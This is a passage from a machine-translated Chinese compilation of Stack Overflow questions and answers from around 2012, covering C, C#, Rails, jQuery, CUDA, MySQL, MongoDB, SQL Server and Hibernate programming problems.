    self.list.push({id:i});
  }
}); 
```

您可以使用默认数组函数（如`push`, `splice`, ）来操作显示的列表`pop`。

或者[在这里试试](https://jsbin.com/luyuhos/edit?html,js,output)

# c - 需要澄清位移

> ID：10989689
> 
> 赞同：2
> 
> 时间：2012-06-12T01:59:07.773
> 
> 标签：c

```
void test()
{

    unsigned char c;
    c = (~0)>>1 ;  
    printf("c is %u\n",c); 

} 
```

它打印 255。我期待 127，因为我期待右移后最左边的位设置为 0。这是因为我的编译器正在进行右旋转吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-12T02:04:03.997

文字`0`的类型是`int`。因此整个表达式将被评估为类型`int.`

表达方式：

```
(~0) >> 1 
```

评估为 type `int`。

*   因此`~0`正在评估`0xffffffff`（假设为 32 位）。
*   换档后变成：`0x7fffffff`.

当您存储到`c`(which is `unsigned char`) 时，它会截断为`0xff`which is `255`。

要获得`127`您所期望的，您需要强制转换`~0`：

```
c = (unsigned char)(~0) >> 1; 
```

* * *

**旁注：**即使我们只投射`0`to `unsigned char`，结果仍然是`255`。这是因为隐式整数提升。所有小于 的中间体`int`都被提升为`int`。

更多信息：[https ://www.securecoding.cert.org/confluence/display/seccode/INT02-C.+Understand+integer+conversion+rules](https://www.securecoding.cert.org/confluence/display/seccode/INT02-C.+Understand+integer+conversion+rules)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-12T02:03:52.217

您的编译器将 ~0 视为 int，然后移位，然后转换为 unsigned char。该程序输出您的期望值：

```
void test()
{
    unsigned char c;
    c = ((unsigned char)(~0)) >> 1 ;  
    printf("c is %u\n",c); 
} 
```

# c# - 无法从 Process.Start 运行命令

> ID：10989690
> 
> 赞同：5
> 
> 时间：2012-06-12T01:59:08.367
> 
> 标签：c#, .net

我可以从命令行很好地运行它：

```
C:\Windows\System32\rundll32.exe "C:\Program Files (x86)\Windows Photo Viewer\PhotoViewer.dll", ImageView_Fullscreen  C:\Users\Public\Pictures\Sample Pictures\Chrysanthemum.jpg 
```

图片打开没问题。

但是，当我尝试这样做时：

```
exe = "C:\\Windows\\System32\\rundll32.exe \"C:\\Program Files (x86)\\Windows Photo Viewer\\PhotoViewer.dll\", ImageView_Fullscreen  C:\\Users\\Public\\Pictures\\Sample Pictures\\Chrysanthemum.jpg";
Process.Start(exe); 
```

我得到一个

> System.ComponentModel.Win32Exception：系统找不到指定的文件

我已经尝试在命令行和 C# 上使用引号，但都不能使用它们。根据我最近在 SO 上阅读的答案，不应引用最后一部分。

这是怎么回事？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-06-12T02:14:57.157

事实证明，必须分别传递命令和参数：

```
exe = "C:\\Windows\\System32\\rundll32.exe";
arguments = "\"C:\\Program Files (x86)\\Windows Photo Viewer\\PhotoViewer.dll\", ImageView_Fullscreen  C:\\Users\\Public\\Pictures\\Sample Pictures\\Chrysanthemum.jpg";
Process.Start(exe, arguments); 
```

# ruby-on-rails-3 - 如何管理 Rails 关联和数据库外键约束之间的差异？

> ID：10989691
> 
> 赞同：1
> 
> 时间：2012-06-12T01:59:15.107
> 
> 标签：ruby-on-rails-3, postgresql

我遇到了 Rails 3.2 关联和 PostgreSQL 外键之间的细微差别，我想确定我了解管理它的最佳方法。

假设一个 Message 类跟踪它正在回复的消息。删除“来自”消息不应删除链中的其余消息，因此没有`:dependent => :destroy`子句。

```
class Message < ActiveRecord::Base
  # from_message_id self-reference
  has_many   :from_messages, :foreign_key => "from_message_id", 
             :class_name => "Message", :inverse_of => :from_message
  belongs_to :from_message, 
             :class_name => "Message", :inverse_of => :from_messages

  attr_accessible :from_message_id, subject, body
end 
```

现在，如果我创建两个链接的消息，并删除第一个，Rails 只会报告它不存在：

```
m1 = Message.create
m2 = Message.new
m2.from_message = m1
m2.save
m1.destroy
m2.from_message
=> nil 
```

但是，如果我还从迁移中向数据库添加了一个实际的外键约束：

```
execute "ALTER TABLE messages ADD CONSTRAINT messages_from_message_fk 
         FOREIGN KEY (from_message_id)  REFERENCES messages(id);" 
```

然后我得到一个相当讨厌的中止，因为密钥仍在使用中：

```
m1 = Message.create
m2 = Message.new
m2.from_message = m1
m2.save
m1.destroy
=> ActiveRecord::InvalidForeignKey: PG::Error: ERROR:  update or delete on table 
"messages" violates foreign key constraint "messages_from_message_fk" on 
table "messages"
DETAIL:  Key (id)=(2) is still referenced from table "messages". 
```

这些结论正确吗？

*   Rails 仅使用`has_many`and`belongs_to`来跟踪哪些字段包含哪些外键。删除“父”记录时，不会验证子记录不会成为孤立记录。

*   具有外键约束的 PostgreSQL 要求在删除父级之前，所有子级都与父级“取消链接”。只要外键可以为空，这可以通过在删除父级之前将子级的外键设置为空来实现。

就我而言，我*想*允许孤儿。我最好忘记数据库约束，还是在删除父项时保留它并取消链接记录有什么价值？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T11:03:48.760

> 就我而言，我想允许孤儿。我最好忘记数据库约束，还是在删除父项时保留它并取消链接记录有什么价值？

在 PostgreSQL 中，通过删除外键约束来更改表，然后使用 ON DELETE SET NULL 重新添加它；在这种情况下，删除将级联到将外键设置为空，从而允许孤儿。

# javascript - 一旦到达另一个 div 就停止 div 滚动

> ID：10989695
> 
> 赞同：5
> 
> 时间：2012-06-12T02:00:33.120
> 
> 标签：javascript, jquery

基本上，我目前有一个 div 保持固定并在用户滚动时跟随用户向下滚动，直到达到某个点。我可以很容易地让它停在一个固定的像素位置，就像我在下面的例子中所做的那样，但是因为我是一个 jQuery 白痴，我不知道如何让它停在一个 div 上。

这是我到目前为止使用的：

```
var windw = this;

$.fn.followTo = function ( pos ) {
     var $this = this,
        $window = $(windw);

$window.scroll(function(e){
    if ($window.scrollTop() > pos) {
        $this.css({
            position: 'absolute',
            top: pos
        });
    } else {
        $this.css({
            position: 'fixed',
            top: 0
        });
    }
});
};

$('#one').followTo(400); 
```

这是示例：[jsFiddle](http://jsfiddle.net/Tgm6Y/1445/)

我希望它在到达第二个 div 时停止的原因是因为使用我使用的流畅布局，第二个 div 将根据浏览器大小坐在不同的点。为它定义一个特定的停止点是行不通的。任何人都知道如何让这个做我想做的事？或者，固定 div 是否有可能在达到向下的百分比时停止滚动？我环顾四周，但没有发现任何东西。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-12T03:26:05.337

这是你要找的吗？

[http://jsfiddle.net/Tgm6Y/1447/](http://jsfiddle.net/Tgm6Y/1447/)

```
var windw = this;

$.fn.followTo = function ( elem ) {
    var $this = this,
        $window = $(windw),
        $bumper = $(elem),
        bumperPos = $bumper.offset().top,
        thisHeight = $this.outerHeight(),
        setPosition = function(){
            if ($window.scrollTop() > (bumperPos - thisHeight)) {
                $this.css({
                    position: 'absolute',
                    top: (bumperPos - thisHeight)
                });
            } else {
                $this.css({
                    position: 'fixed',
                    top: 0
                });
            }
        };
    $window.resize(function()
    {
        bumperPos = pos.offset().top;
        thisHeight = $this.outerHeight();
        setPosition();
    });
    $window.scroll(setPosition);
    setPosition();
};

$('#one').followTo('#two'); 
```

编辑：关于您要求在某一点之前不滚动的请求，只需替换以下内容：

```
if ($window.scrollTop() > (bumperPos - thisHeight)) { 
```

有了这个：

```
if ($window.scrollTop() <= (bumperPos - thisHeight)) { 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-06-13T02:01:20.423

受 MicronXD 的 fiddle 启发，但当 DOM 在文档加载（或其他原因）时被大量推送时，编写起来更加灵活，这是我为自己的使用开发的另一个类似解决方案：

```
jQuery.fn.extend({
  followTo: function (elem, marginTop) {
    var $this = $(this);
    var $initialOffset = $this.offset().top;
    setPosition = function() {
      if ( $(window).scrollTop() > $initialOffset ) {
        if ( elem.offset().top > ( $(window).scrollTop() + $this.outerHeight() + marginTop ) ) {
          $this.css({ position: 'fixed', top: marginTop });
        }
        if ( elem.offset().top <= ( $(window).scrollTop() + $this.outerHeight() + marginTop ) ) {
          $this.css({ position: 'absolute', top: elem.offset().top - $this.outerHeight() });
        }
      }
      if ( $(window).scrollTop() <= $initialOffset ) {
        $this.css({ position: 'relative', top: 0 });
      }
    }
    $(window).resize( function(){ setPosition(); });
    $(window).scroll( function(){ setPosition(); });
  }
}); 
```

然后您可以像这样运行该函数：

```
$('#div-to-move').followTo( $('#div-to-stop-at'), 60); 
```

60 是您希望浮动元素在位置时从屏幕顶部具有的可选边距：固定，以像素表示。

# joomla - Joomla - 在评级框中添加一些自定义文本

> ID：10989696
> 
> 赞同：0
> 
> 时间：2012-06-12T02:00:44.413
> 
> 标签：joomla

我们正在使用 Joomla 版本 1.5.13。我应该在文件系统的哪个位置修改评级框以包含一些超链接文本，如下所示？

![在此处输入图像描述](../Images/213d62f302b3155513d123022b0bd7c0.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T13:59:32.917

首先，请升级到最新版本的 Joomla 以获得更高的安全性和错误修复。没有理由使用这么旧的版本。

我假设您正在使用评级系统的插件，在这种情况下，请指定哪个插件，以便其他人更好地了解如何提供帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T21:53:21.557

我想到了。我需要打开 /plugins/content/vote.php。页面底部是结束`</form>`标记的呈现。在其下方插入新的 HTML。

```
...
        }
        $html .= '</form>';
        // Insert link text below
        $html .= '<a href="link.html">Hyperlinked Text Here</a>';
    }
    return $html;
} 
```

# c - 如何获取变量地址的地址（&& 是编译器错误）？

> ID：10989701
> 
> 赞同：0
> 
> 时间：2012-06-12T02:02:18.120
> 
> 标签：c, pointers, cuda

我有一个快速的问题，我似乎无法在网上找到。

我正在使用 CUDA 做一些 GPU 工作，我需要在 GPU 上分配一些数据。cudaMalloc 函数如下所示：

```
cudaMalloc(void** identifier, size_t space); 
```

很容易。所以，让我们分配一个整数。

```
int i = 5;
cudaMalloc((void**)&(&i), sizeof(int)); 
```

但是这个错误（“表达式必须是左值或函数指示符”）。明显的解决方法是先声明`i`为一个指针，然后获取它的地址，这非常好；我只是讨厌变通方法。

我觉得这个问题应该有一个明显的答案 - 毕竟，`**`,`***`甚至`**********`在 C 中工作得很好。那么，我如何“干净地”获取变量地址的地址？

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-12T02:06:00.343

这*不是*解决方法。这是正确的做法。

该函数需要指向 的指针的地址`int`，因为它将将该指针设置为指向`int`它刚刚分配的一个。因此，您需要一个真实的已分配指针的地址。像“&&i”这样的表达式要求编译器给你 i 的地址——这是一个纯数字，没有存储位置——然后给你一个指向那个值的指针，这当然是做不到的。

所以你想说

```
int *p;
cudaMalloc((void**)&p, sizeof(int)); 
```

现在`*p`是`int`分配的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T02:10:01.930

获取地址的地址是不可能的。只有*对象*有地址，地址不是对象。您可以将地址分配给指针（这是一个对象），然后获取该指针的地址，这就是您所说的“解决方法”。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T02:07:43.283

您无法获得对引用的引用，因为`&i`它没有存储在任何地方，您无法访问它的内存位置，因为它不存在。

您应该使用指向 int 的指针。

```
int *i = calloc(sizeof(int),1); 
```

那么它的引用将是存储在某处的指针变量的地址。当然，如果指针需要在范围之外有效，则不能在本地范围内执行此操作，因为您将在堆栈上进行分配。

# c - Windows 中是否有类似于 Linux 中的消息队列的机制？

> ID：10989702
> 
> 赞同：3
> 
> 时间：2012-06-12T02:02:19.400
> 
> 标签：c, windows, message

最近，我得到了一份工作（C/C++），在 Windows 中使用不同线程之间的消息通信。我用谷歌搜索，发现 Windows 也有一个消息队列，但它与窗口更相关，实际上，我的应用程序中不需要任何窗口。

就像Linux中的消息队列一样，每个线程创建一个消息队列并得到一个消息队列ID，向该ID发送消息，从该ID接收等等，这就是我需要的消息队列。

Windows中是否有类似的机制可以这样工作？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-12T02:12:07.057

您不需要窗口即可在 Windows 上使用消息，任何调用 PeekMessage 或 GetMessage 的线程都会获得一个消息队列，您可以使用[PostThreadMessage](http://msdn.microsoft.com/en-us/library/windows/desktop/ms644946%28v=vs.85%29.aspx)向其发布消息。

消息应该在同一个进程中正常工作，但如果这是跨进程并且您需要发送超过 size_t*2 的消息，则应该查看其他[IPC 机制](http://msdn.microsoft.com/en-us/library/windows/desktop/aa365574%28v=vs.85%29.aspx)或使用共享内存和某种类型的锁定构建自己的。Windows 也有[MSMQ](http://en.wikipedia.org/wiki/Microsoft_Message_Queuing)。

您没有指定是否需要确切的 POSIX 接口，无论哪种方式，维基百科都有一个开源替代方案[列表......](http://en.wikipedia.org/wiki/Message_queue)

# asp.net - 在 iframe 中打开页面

> ID：10989704
> 
> 赞同：0
> 
> 时间：2012-06-12T02:02:35.163
> 
> 标签：asp.net, html, iframe

我有一个托管在专用服务器中的应用程序。我需要将应用程序的登录页面加载到 iframe 中。用户输入用户名和密码后，用户点击登录按钮，然后被重定向到主页。以下是我的代码：（主页也应该在 iframe 中打开。）

```
<iframe id="top" style="width:790px; background-color:#e0effb; height:600px" frameborder="0" 
src="https://www.test.com/">

</iframe> 
```

我的问题是 iframe 打开登录页面，但是在我单击登录按钮后，它给了我 404 错误：找不到页面。这个问题出现在 IE 中，但在 Chrome 中可以正常工作。我的登录按钮点击代码是：

```
Response.Redirect(ResolveUrl("~/Home.aspx")); 
```

# php - Mysql 问题转义引号

> ID：10989706
> 
> 赞同：0
> 
> 时间：2012-06-12T02:03:12.317
> 
> 标签：php, mysql

我一直在 MYSQL 中插入一些带有转义引号的数据，如 \' 或 \" 这里的问题是 mysql 插入了完整的序列 \' 而不是 '

我在网上找不到解决方案

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T03:13:51.513

而不是替换单个引号，运行该函数

```
$cleanString = mysql_real_escape_string($incomingText); 
```

（请注意，此方法已被弃用以代替以下方法）或

```
$cleanString = mysqli_real_escape_string($incomingText); 
```

这也将保护您免受 SQL 注入。运行方法后，插入文本`$cleanString`而不是`$incomingText`.

希望这可以帮助。

# node.js - 如何使用 mongojs 删除记录

> ID：10989707
> 
> 赞同：3
> 
> 时间：2012-06-12T02:03:24.363
> 
> 标签：node.js, mongodb, mongojs

我将 mongojs 与 nodejs 和 express 一起使用。从这么多在线文档中我只找到了`find()` `save()` `update()`方法。有`delete`api吗？如果是这样，如何使用它？

我正在尝试根据 _id 删除一条记录，该记录由 mongdodb 自动生成...

任何链接和示例将不胜感激。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-12T02:22:39.630

使用`remove`方法。快速查看[源代码](https://github.com/gett/mongojs/blob/master/index.js)，它看起来只是一个传递，因此它可能使用与本机节点驱动程序相同的参数约定，因此请查看这些[文档](http://mongodb.github.com/node-mongodb-native/api-generated/collection.html#remove)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-03-29T14:10:46.757

```
db.collection.remove(query, [justOne], [callback]) 
```

例如，您可以阅读 monogojs 的文档[https://github.com/mafintosh/mongojs](https://github.com/mafintosh/mongojs) 要从清单中删除单个文档，请调用 remove() 方法，并将 justOne 参数设置为 true 或 1（默认）。例如

```
db.inventory.remove( { type : "food" }, callback) 
```

# c# - 使用默认网络浏览器打开一个 html 文件

> ID：10989709
> 
> 赞同：19
> 
> 时间：2012-06-12T02:03:42.933
> 
> 标签：c#, browser

我正在使用它来获取默认网络浏览器的路径和可执行文件：

```
public static string DefaultWebBrowser
        {
            get
            {

                string path = @"\http\shell\open\command";

                using (RegistryKey reg = Registry.ClassesRoot.OpenSubKey(path))
                {
                    if (reg != null)
                    {
                        string webBrowserPath = reg.GetValue(String.Empty) as string;

                        if (!String.IsNullOrEmpty(webBrowserPath))
                        {
                            if (webBrowserPath.First() == '"')
                            {
                                return webBrowserPath.Split('"')[1];
                            }

                            return webBrowserPath.Split(' ')[0];
                        }
                    }

                    return null;
                }
            }
        } 
```

和：

```
 protected static bool Run(string FileName, string Args)
        {
            try
            {
                Process proc = new Process();

                processInfo.FileName = FileName;
                 proc.StartInfo.WindowStyle = ProcessWindowStyle.Normal;

                if(Args != null) proc.StartInfo.Arguments = Args;

                proc.Start();

                return true;
            }
            catch (Exception) { }

            return false;
        } 
```

然后我调用网络浏览器：`Run(DefaultWebBrowser, "foo.html")`

问题是：上面的函数调用的是 Firefox 和 IE（我电脑上安装的两个网络浏览器），而不是默认的网络浏览器 Internet Explorer。我不知道如何解决这个问题。

**编辑**

我已经下载并安装了谷歌浏览器，将其设置为默认网络浏览器，但奇怪的是，上面的错误并没有发生。

* * *

## 回答 #1

> 赞同：43
> 
> 时间：2012-06-12T02:06:35.100

您可以将所有代码替换为

```
System.Diagnostics.Process.Start(pathToHtmlFile); 
```

这将自动启动您的默认浏览器，或者查找`.htm`或`.html`文件的默认处理程序并使用它。

现在将 Firefox 设置为默认值，这有时会导致奇怪的异常（我认为如果 Firefox 是第一次启动），因此您可能需要`try/catch`对其进行处理。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2019-05-29T06:30:00.067

对于**.Net Core**，您需要调用（建议在[.Net Core 2.0 Process.Start throws "The specified executable is not a valid application for this OS platform"](https://stackoverflow.com/questions/46808315/net-core-2-0-process-start-throws-the-specified-executable-is-not-a-valid-appl/46808516#46808516)）

```
 var proc = Process.Start(@"cmd.exe ", @"/c " + pathToHtmlFile); 
```

当我尝试时`Process.Start(pathToHtmlFile);`，我得到了*System.ComponentModel.Win32Exception: The specified executable is not a valid application for this OS platform*。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-01-23T08:21:26.393

对于那些没有 html 默认关联到浏览器的用户，请使用

`System.Diagnostics.Process.Start("Chrome", Uri.EscapeDataString(pathToHtmlFile))`

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2022-02-26T21:29:15.367

如果您遇到`System.ComponentModel.Win32Exception`异常，则需要设置`UseShellExecute`为`true`

```
var p = new Process();
p.StartInfo = new ProcessStartInfo(@"C:\path\test.html")
{
    UseShellExecute = true
};
p.Start(); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-08-29T15:22:51.850

使用时出现此错误`System.Diagnostics.Process.Start(pathToHtmlFile);`：

`System.ComponentModel.Win32Exception: 'The specified executable is not a valid application for this OS platform.`'

我可以使用以下代码在默认浏览器中打开 html 文件：

```
System.Diagnostics.Process process = new System.Diagnostics.Process();
try
{
    process.StartInfo.UseShellExecute = true;
    process.StartInfo.FileName = pathToHtmlFile;
    process.Start();
}
catch (Exception e)
{
    Console.WriteLine(e.Message);
} 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2017-12-04T10:57:30.677

我使用代码，我首先在其中查找 exe 文件。例如，如果存在 chrome.exe（在其默认路径中），如果存在 firefox.exe 或 launcher.exe（用于歌剧）等...如果不存在，请尝试使用 pathToHtmlFile 参数运行 iexplore.exe。这是我的解决方案，我使用外部配置，设置我的浏览器，不管在操作系统中设置什么默认值。

# iphone - 如何创建一组 uiimage 的副本？

> ID：10989711
> 
> 赞同：0
> 
> 时间：2012-06-12T02:03:48.983
> 
> 标签：iphone, objective-c, ios, copy, nscache

所以这可能有点难以解释，但我会尽力而为。这个问题也可能需要几个步骤来解决。

此代码出现在 tableviewcell 中，因此每次单元格出现在屏幕上时都会运行它：

```
[cell.cellContent.thumbnails removeAllObjects];

if ([self.cellThumbnailCache objectForKey:[NSNumber numberWithInt:indexPath.row]]) {
    cell.cellContent.thumbnails = [self.cellThumbnailCache objectForKey:[NSNumber numberWithInt:indexPath.row]];
    [cell.cellContent setNeedsDisplay];
}
else {

    //First it removes all the existing UIImages from the cell.cellContent.thumbnails mutable array.
    int i = 0;

    while (i < numberOfThumbnailsToDraw) {
        Media *media = [entryNewMoc.media objectAtIndex:i];
        UIImage *image = [media getThumbnail];

        [newMoc save:nil];

        [cell.cellContent.thumbnails addObject:image];
        i++;
    }

    //Then it goes through getting UIImages and adding them to the array.
    [self.cellThumbnailCache setObject:cell.cellContent.thumbnails forKey:[NSNumber numberWithInt:indexPath.row]];
    [cell.cellContent setNeedsDisplay];

    //Then it all gets drawn in setNeedsDisplay.
} 
```

问题是，当它返回删除所有对象时，它似乎从记录中删除了实际的 UIImages，因为 thumbnailsCache 上的 NSLog 显示该条目为空。执行此操作的是 removeAllObjects 行，但如果保留它，它只会继续向单元格添加更多媒体。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T02:16:54.073

尝试分配简单的副本，例如：

```
[self.cellThumbnailCache setObject:[NSSet setWithSet:cell.cellContent.thumbnails] .... 
```

# algorithm - 在重叠区间中查找所有区间（重叠和非重叠）

> ID：10989712
> 
> 赞同：5
> 
> 时间：2012-06-12T02:03:51.973
> 
> 标签：algorithm, data-structures

我的问题与此处提出的问题非常相似： [在重叠区间中查找基本区间](https://stackoverflow.com/questions/8501423/finding-elementary-intervals-in-overlapping-intervals)

我喜欢那里给出的最佳解决方案，但由于我需要保留额外的关键信息，我需要对该算法进行一些调整/进一步解释。作为背景，这些数字是数据库中参与者的年龄范围。我需要计算重叠，以便我可以在重叠的研究实验室之间平均分配参与者，如果没有重叠，我可以将所有参与者分配给那个实验室。

这就是我得到的：

```
Interval    Lab
{75, 105}    A
{100, 120}   B
{100, 130}   C 
```

这是我想从输入中得到的（所以我知道要查询什么）：

```
Interval    Lab(s)
{75, 100}    A
{100, 105}   A, B, C
{105, 120}   B, C
{120, 130}   C 
```

使用上一个问题中给出的顶级算法，我可以很容易地得到嵌套： {75, 100, 105, 120, 130} 这导致了间隔： {75, 100} {100, 105} {105, 120} { 120, 130}。这很好，但现在我不知道哪些时间间隔对应于哪些实验室（没有另一个通过列表，一个一个地检查每个实验室，这可能是低效的）。

谁能向我解释如何轻松做到这一点？谢谢您的帮助！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-12T03:13:11.107

使用关联的实验室创建第二个阵列

```
{A, [B,C], A, B, C}
{75, 100, 105, 120, 130} 
```

在您创建间隔时，请保持一组正在运行的实验室。当您点击索引 i 时，如果第 i 个实验室不存在，则添加它，如果存在，则将其删除。将每个新区间 i 到 i+1 与集合中的项目相关联。

例如，

```
i = 0; set = {A}; interval = 75-100; 
i = 1; set = {A,B,C}; interval = 100-105; 
i = 2; set = {B,C}; interval = 105-120; 
i = 3; set = {C}; interval = 120-130; 
```

# iphone - 另一个线程中的内存泄漏

> ID：10989716
> 
> 赞同：0
> 
> 时间：2012-06-12T02:04:17.723
> 
> 标签：iphone, objective-c, memory-leaks

我使用[SIMPLEFTP](http://developer.apple.com/library/ios/#samplecode/SimpleFTPSample/Listings/Read_Me_About_SimpleFTPSample_txt.html)进行 ftp 请求，当我在主线程中进行请求时，一切正常。但是当我使用 GCD 在另一个线程中运行 ftp 请求时，有时会出现内存泄漏：

![在此处输入图像描述](../Images/c3308dd0354c5baf543d7e8efec884f1.png)

我想知道为什么在不同的线程中事情会有所不同以及如何解决这个问题？

# sql-server-2008 - 检查记录是否存在并以最有效的方式退出

> ID：10989718
> 
> 赞同：1
> 
> 时间：2012-06-12T02:04:39.733
> 
> 标签：sql-server-2008, tsql

我的存储过程中有以下脚本

```
IF EXISTS(SELECT * FROM dbo.MBLPosition WHERE PositionGKey = @i_PositionGKey) RETURN

-- DO SOME STUFF HERE

INSERT dbo.MBLPosition.. 
```

我正在向表中插入一些数据（单条记录）。首先我检查它是否已经存在，然后我进行一些处理并插入记录。

处理可能需要一些时间 - 比如说 2 秒。有时电话随后进来，我得到约束异常。罕见，但会发生。我想避免这种情况，同时如果记录已经存在，我不想进行此处理。构造此代码的最佳方法是什么，以便我不做额外的工作并避免异常？

这是一张大表，随时都有记录。什么是当他们进来并且不花费太多处理时间时过滤掉骗子的最佳方法？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-12T02:17:13.967

一种方法是执行检查，然后您始终可以使用 try/catch 来尝试插入。正如@MitchWheat 指出的那样，您可以使用适当的事务处理来消除这种情况。

```
IF NOT EXISTS
(
  SELECT 1 FROM dbo.MBLPosition 
  WHERE PositionGKey = @i_PositionGKey
)
BEGIN
  BEGIN TRY
    -- do some stuff here
    INSERT dbo.MBLPosition..
  END TRY
  BEGIN CATCH 
    PRINT 'Not an exception, but insert failed';
  END CATCH
END 
```

我在这里处理了一个类似的话题：

*   [在进入 TRY 和 CATCH 逻辑之前检查潜在的约束违规](http://www.mssqltips.com/sqlservertip/2632/checking-for-potential-constraint-violations-before-entering-sql-server-try-and-catch-logic/?utm_source=AaronBertrand)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-12T02:17:07.060

您应该使用[事务](http://msdn.microsoft.com/en-us/library/ms173763%28v=sql.105%29.aspx)（具有足够的隔离级别）来使测试和后续`INSERT`原子化。

如果您随后遇到死锁，您可能想要打开快照隔离（正如您所说的处理可能需要一些时间，尽管 2 秒似乎很长......）

# mysql - Hibernate SQL DDL脚本错误150，无法进行外键约束

> ID：10989721
> 
> 赞同：0
> 
> 时间：2012-06-12T02:04:51.520
> 
> 标签：mysql, sql, hibernate, jakarta-ee, hibernate-mapping

我正在使用 hibernate/jpa 注释来自动创建/执行 DDL 脚本。

我的所有表都在创建，除了一个表“UserAccount”和所有表上的外键“约束”。

在检查 Apache Tomact 日志时，我注意到几个错误类似的错误：

错误输出：

严重：不成功：创建表 user_account (user_id bigint not null auto_increment, active bit, address_1 varchar(255), address_2 varchar(255), email varchar(255), first _name varchar(255), last_name varchar(255), phone_contact_1 varchar (255)，phone_contact_2 varchar(255)，user_type varchar(255)，Registeration_Code_fk bigint 不为空，主键 (user_id)) 2012 年 6 月 11 日下午 6:42:42 org.hibernate.tool.hbm2ddl.SchemaExport 创建

严重：您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以在 2012 年 6 月 11 日 6:42:42 的第 1 行 '_name varchar(255), last_name varchar(255), phone_contact_1 varchar(255), phone_' 附近使用正确的语法PM org.hibernate.tool.hbm2ddl.SchemaExport 创建

严重：不成功：更改表 Indust_Of_Interest 添加索引 FKBCDB75CAF90F35D9 (user_id)，添加约束 FKBCDB75CAF90F35D9 外键 (user_id) 引用 user_account (user_id) 2012 年 6 月 11 日下午 6:42:42 org.hibernate.tool.hbm2ddl.SchemaExport create

严重：无法创建表'yourmarketnet.#sql-584_86c'（错误号：150）

等等……</p>

1）我的第一个问题是让hibernate生成正确的SQL DDL语法（这个错误很奇怪，因为Hibernate给出正确的SQL方言应该很容易生成正确的SQL DLL）？

2）我的第二个问题是关于外键错误（errno：150），我之前在手动创建 DDL 时看到过这个错误/错误，但是如何通过 Hibernate 修复它？

我的 UserAccount 类/实体：

```
/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package com.yourmarketnet.beans;

import java.io.Serializable;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import javax.persistence.*;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;

/**
 *
 * @author naim
 */
@Entity
@Table(name = "user_account")
public class UserAccount implements Serializable {

    @Autowired
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY, generator = "user_account_seq")
    @SequenceGenerator(name = "user_account_seq", sequenceName = "user_account_seq")
    @Column(name = "user_id")
    private Long UserId = null;
    //
    @Autowired
    @Column(name = "user_type")
    private String UserType = null;
    //
    @Autowired
    @Column(name = "first _name")
    private String FirstName;
    //
    @Autowired
    @Column(name = "last_name")
    private String LastName;
    //
    @Autowired
    @Column(name = "email")
    private String Email;
    //
    @Autowired
    @Column(name = "phone_contact_1")
    private String PhoneContact1= null; 
    //
     @Autowired
    @Column(name = "phone_contact_2")
    private String PhoneContact2= null; 
    //
    @Autowired
    @Column(name = "address_1")
    private String Address_1 = null; 
    //
    @Autowired
    @Column(name = "address_2")
    private String Address_2 = null; 
    // 1 to many relation with industeries of interest 
    @Autowired
    @Column(name = "industeries_of_interest_set")
    @OneToMany (fetch = FetchType.LAZY, mappedBy="UserAccount" , cascade=CascadeType.ALL)
    private Set<IndusteriesOfInterest> IndusteriesOfInterestSet = new HashSet();
     // 1 to many relation with message posts per user account 
    @Autowired
    @Column(name = "message_posts_list")
    @OneToMany (fetch = FetchType.LAZY, mappedBy="UserAccount" , cascade=CascadeType.ALL)
    private List<MessagePost> MessagePostsList = new ArrayList<MessagePost>();
    //1 to many relation with inventory per user account 
    @Autowired
    @Column(name="inventory_list")
    @OneToMany (fetch = FetchType.LAZY, mappedBy="UserAccount" , cascade=CascadeType.ALL)
    private List<Inventory> InventoryList  = new ArrayList<Inventory>();
    //is the user account Active either due to user deactivation,admin deactivation, or nonpayment
    @Autowired
    @Column(name = "active")
    private boolean Active = false;
    //registerationCode relationship with UserRegisteration object 
    @Autowired
    @Qualifier("UserRegisteration")
    @OneToOne(fetch = FetchType.LAZY)
    @JoinColumn(name = "Registeration_Code_fk", referencedColumnName="registeration_code", nullable = false)
    private UserRegisteration UserRegisteration;

    @Autowired(required = false)
    public UserAccount() {
    }

    @Autowired(required = true)
    public UserAccount(Long UserId, String FirstName, String LastName, String Email) {
        this.UserId = UserId;
        this.FirstName = FirstName;
        this.LastName = LastName;
        this.Email = Email;
    }

    private class Password {

        private UserAccount UserAccount = null;
        private String password = null;

        public Password(UserAccount UserAccount, String password) {
            this.UserAccount = UserAccount;
            this.password = password;
        }

        public UserAccount getUserAccount() {
            return UserAccount;
        }

        public String getPassword() {
            return password;
        }
    }

    public String getAddress_1() {
        return Address_1;
    }

    public void setAddress_1(String Address_1) {
        this.Address_1 = Address_1;
    }

    public String getAddress_2() {
        return Address_2;
    }

    public void setAddress_2(String Address_2) {
        this.Address_2 = Address_2;
    }

    public String getPhoneContact1() {
        return PhoneContact1;
    }

    public void setPhoneContact1(String PhoneContact1) {
